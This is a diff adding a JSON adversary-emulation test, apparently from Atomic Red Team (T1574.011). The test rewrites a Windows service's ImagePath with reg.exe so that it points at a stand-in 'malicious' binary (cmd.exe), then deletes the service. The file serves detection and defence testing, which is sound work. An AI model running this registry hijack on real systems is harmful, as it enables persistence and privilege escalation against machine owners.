@@ -1,0 +1,117 @@
+{
+  "id": "f38e9eea-e1d7-4ba6-b716-584791963827",
+  "name": "Service ImagePath Change with reg.exe",
+  "description": "Change Service registry ImagePath of a bengin service to a malicious file\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "7f1abace-1c63-4cce-b7cd-6f4e17499ddd",
+      "type": "execute-command",
+      "data": {
+        "command": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /f /v ImagePath /d \"#{malicious_service_path}\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f48a3ea8-76dc-4af8-a017-38641ff6e75b",
+      "type": "execute-command",
+      "data": {
+        "command": "sc.exe delete #{weak_service_name}\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d643ecfe-2afc-478c-ad32-7690c033ae9b",
+      "name": "Check dependency 1/1",
+      "description": "The service must exist (#{weak_service_name})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Get-Service #{weak_service_name}) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "694dd050-4576-4461-8be4-9908c0e06156",
+      "name": "Resolve dependency 1/1",
+      "description": "The service must exist (#{weak_service_name})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "sc.exe create #{weak_service_name} binpath= \"#{weak_service_path}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "707c40f4-24a4-449c-8104-ab7c3143dfd7",
+      "name": "Re-check dependency 1/1",
+      "description": "The service must exist (#{weak_service_name})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Get-Service #{weak_service_name}) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "7f1abace-1c63-4cce-b7cd-6f4e17499ddd",
+      "p": "on-success",
+      "o": "f48a3ea8-76dc-4af8-a017-38641ff6e75b"
+    },
+    {
+      "s": "7f1abace-1c63-4cce-b7cd-6f4e17499ddd",
+      "p": "on-failure",
+      "o": "f48a3ea8-76dc-4af8-a017-38641ff6e75b"
+    },
+    {
+      "s": "d643ecfe-2afc-478c-ad32-7690c033ae9b",
+      "p": "on-success",
+      "o": "7f1abace-1c63-4cce-b7cd-6f4e17499ddd"
+    },
+    {
+      "s": "d643ecfe-2afc-478c-ad32-7690c033ae9b",
+      "p": "on-failure",
+      "o": "694dd050-4576-4461-8be4-9908c0e06156"
+    },
+    {
+      "s": "694dd050-4576-4461-8be4-9908c0e06156",
+      "p": "on-success",
+      "o": "707c40f4-24a4-449c-8104-ab7c3143dfd7"
+    },
+    {
+      "s": "707c40f4-24a4-449c-8104-ab7c3143dfd7",
+      "p": "on-failure",
+      "o": "7f1abace-1c63-4cce-b7cd-6f4e17499ddd"
+    }
+  ],
+  "tags": [
+    "T1574.011",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "weak_service_name",
+      "type": "string",
+      "description": "weak service name",
+      "value": "calcservice"
+    },
+    {
+      "name": "weak_service_path",
+      "type": "string",
+      "description": "weak service path",
+      "value": "%windir%\\system32\\win32calc.exe"
+    },
+    {
+      "name": "malicious_service_path",
+      "type": "string",
+      "description": "malicious service path",
+      "value": "%windir%\\system32\\cmd.exe"
+    }
+  ]
+}
